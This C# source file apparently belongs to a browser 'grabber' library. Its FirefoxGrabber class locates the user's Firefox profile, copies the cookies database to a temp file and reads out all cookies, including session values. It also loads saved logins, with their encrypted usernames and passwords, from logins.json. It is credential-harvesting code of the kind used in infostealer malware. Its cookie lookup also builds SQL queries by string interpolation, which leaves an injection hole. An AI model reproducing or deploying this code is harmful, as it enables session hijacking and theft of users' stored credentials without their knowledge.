using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web.Script.Serialization;

namespace CockyGrabber.Grabbers
{
    public class FirefoxGrabber
    {
        private const string CookieCommandText = "SELECT id,originAttributes,name,value,host,path,expiry,lastAccessed,creationTime,isSecure,isHttpOnly,inBrowserElement,sameSite,rawSameSite,schemeMap FROM moz_cookies";
        public string FirefoxProfilesPath = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"; // Path to firefox profiles
        public string FirefoxCookiePath { get; set; } // Non constant because firefox profile directories are made out of random chars
        public string FirefoxLoginPath { get; set; } // Non constant because firefox profile directories are made out of random chars

        public FirefoxGrabber()
        {
            // Looks for the main firefox profile which has "default-release" in it's name:
            foreach (string folder in Directory.GetDirectories(FirefoxProfilesPath))
                if (folder.Contains("default-release"))
                {
                    FirefoxCookiePath = folder + @"\cookies.sqlite";
                    FirefoxLoginPath = folder + @"\logins.json";
                }
        }

        #region IO Functions
        /// <summary>
        /// Create a temporary file(path) in %temp%
        /// </summary>
        /// <returns>The path to the temp file</returns>
        private string GetTempFileName() => Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString()); // This is better than Path.GetTempFileName() because GetTempFileName is most of the time inaccurate

        /// <summary>
        /// Returns a value depending on if the database with the stored cookies was found
        /// </summary>
        public bool CookiesExist() => File.Exists(FirefoxCookiePath);

        /// <summary>
        /// Returns a value depending on if the database with the stored logins was found
        /// </summary>
        public bool LoginsExist() => File.Exists(FirefoxLoginPath);
        #endregion

        #region GetCookies()
        public IEnumerable<Firefox.Cookie> GetCookiesBy(Firefox.CookieHeader by, object value)
        {
            List<Firefox.Cookie> cookies = new List<Firefox.Cookie>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!CookiesExist()) throw new CookieDatabaseNotFoundException(FirefoxCookiePath); // throw a CookieDatabaseNotFoundException if the Cookie DB was not found

            // Copy the database to a temporary location because it could be already in use
            string tempFile = GetTempFileName();
            File.Copy(FirefoxCookiePath, tempFile);

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = $"{CookieCommandText} WHERE {by} = '{value}'";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        cookies.Add(new Firefox.Cookie()
                        {
                            Id = reader.GetInt32(0),
                            OriginAttributes = reader.GetString(1),
                            Name = reader.GetString(2),
                            Value = reader.GetString(3),
                            Host = reader.GetString(4),
                            Path = reader.GetString(5),
                            Expiry = reader.GetInt64(6),
                            LastAccessed = reader.GetInt64(7),
                            CreationTime = reader.GetInt64(8),
                            IsSecure = reader.GetBoolean(9),
                            IsHttpOnly = reader.GetBoolean(10),
                            InBrowserElement = reader.GetBoolean(11),
                            SameSite = reader.GetInt16(12),
                            RawSameSite = reader.GetInt16(13),
                            SchemeMap = reader.GetInt16(14),
                        });
                    }
                }
                conn.Close();
            }
            File.Delete(tempFile);

            return cookies;
        }

        public IEnumerable<Firefox.Cookie> GetCookies()
        {
            List<Firefox.Cookie> cookies = new List<Firefox.Cookie>();
            if (!CookiesExist()) throw new CookieDatabaseNotFoundException(FirefoxCookiePath); // throw a CookieDatabaseNotFoundException if the Cookie DB was not found

            // Copy the database to a temporary location because it could be already in use
            string tempFile = GetTempFileName();
            File.Copy(FirefoxCookiePath, tempFile);

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = CookieCommandText;

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        cookies.Add(new Firefox.Cookie()
                        {
                            Id = reader.GetInt32(0),
                            OriginAttributes = reader.GetString(1),
                            Name = reader.GetString(2),
                            Value = reader.GetString(3),
                            Host = reader.GetString(4),
                            Path = reader.GetString(5),
                            Expiry = reader.GetInt64(6),
                            LastAccessed = reader.GetInt64(7),
                            CreationTime = reader.GetInt64(8),
                            IsSecure = reader.GetBoolean(9),
                            IsHttpOnly = reader.GetBoolean(10),
                            InBrowserElement = reader.GetBoolean(11),
                            SameSite = reader.GetInt16(12),
                            RawSameSite = reader.GetInt16(13),
                            SchemeMap = reader.GetInt16(14),
                        });
                    }
                }
                conn.Close();
            }
            File.Delete(tempFile);

            return cookies;
        }
        #endregion

        #region GetLogins()
        public IEnumerable<Firefox.Login> GetLogins()
        {
            if (!LoginsExist()) throw new LoginDatabaseNotFoundException(FirefoxLoginPath); // throw a LoginDatabaseNotFoundException if the Login File was not found

            return Deserialize<_LoginDB>(File.ReadAllText(FirefoxLoginPath)).Logins.ToList();
        }

        public IEnumerable<Firefox.Login> GetLoginsBy(Firefox.LoginHeader by, object value)
        {
            List<Firefox.Login> cookies = new List<Firefox.Login>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!LoginsExist()) throw new LoginDatabaseNotFoundException(FirefoxLoginPath); // throw a LoginDatabaseNotFoundException if the Login File was not found

            foreach (Firefox.Login l in Deserialize<_LoginDB>(File.ReadAllText(FirefoxLoginPath)).Logins)
            {
                switch (by)
                {
                    case Firefox.LoginHeader.id:
                        if (l.Id == (int)value) cookies.Add(l);
                        break;
                    case Firefox.LoginHeader.hostname:
                        if (l.Hostname == (string)value) cookies.Add(l);
                        break;
                    case Firefox.LoginHeader.httpRealm:
                        if (l.HttpRealm == (string)value) cookies.Add(l);
                        break;
                    case Firefox.LoginHeader.formSubmitURL:
                        if (l.FormSubmitURL == (string)value) cookies.Add(l);
                        break;
                    case Firefox.LoginHeader.usernameField:
                        if (l.UsernameField == (string)value) cookies.Add(l);
                        break;
                    case Firefox.LoginHeader.passwordField:
                        if (l.PasswordField == (string)value) cookies.Add(l);
                        break;
                    case Firefox.LoginHeader.encryptedUsername:
                        if (l.EncryptedUsername == (string)value) cookies.Add(l);
                        break;
                    case Firefox.LoginHeader.encryptedPassword:
                        if (l.EncryptedPassword == (string)value) cookies.Add(l);
                        break;
                    case Firefox.LoginHeader.guid:
                        if (l.Guid == (string)value) cookies.Add(l);
                        break;
                    case Firefox.LoginHeader.encType:
                        if (l.EncType == (short)value) cookies.Add(l);
                        break;
                    case Firefox.LoginHeader.timeCreated:
                        if (l.TimeCreated == (long)value) cookies.Add(l);
                        break;
                    case Firefox.LoginHeader.timeLastUsed:
                        if (l.TimeLastUsed == (long)value) cookies.Add(l);
                        break;
                    case Firefox.LoginHeader.timePasswordChanged:
                        if (l.TimePasswordChanged == (long)value) cookies.Add(l);
                        break;
                    case Firefox.LoginHeader.timesUsed:
                        if (l.TimesUsed == (int)value) cookies.Add(l);
                        break;
                }
            }
            return cookies;
        }
        #endregion

        #region JSON Deserializer for the Firefox Logins
        private struct _LoginDB { public Firefox.Login[] Logins { get; set; } }
        private readonly JavaScriptSerializer Serializer = new JavaScriptSerializer();

        /// <summary>
        /// Deserialize a json string and convert it into a type
        /// </summary>
        /// <returns>The deserialized object</returns>
        private T Deserialize<T>(string json) => Serializer.Deserialize<T>(json);
        #endregion
    }
}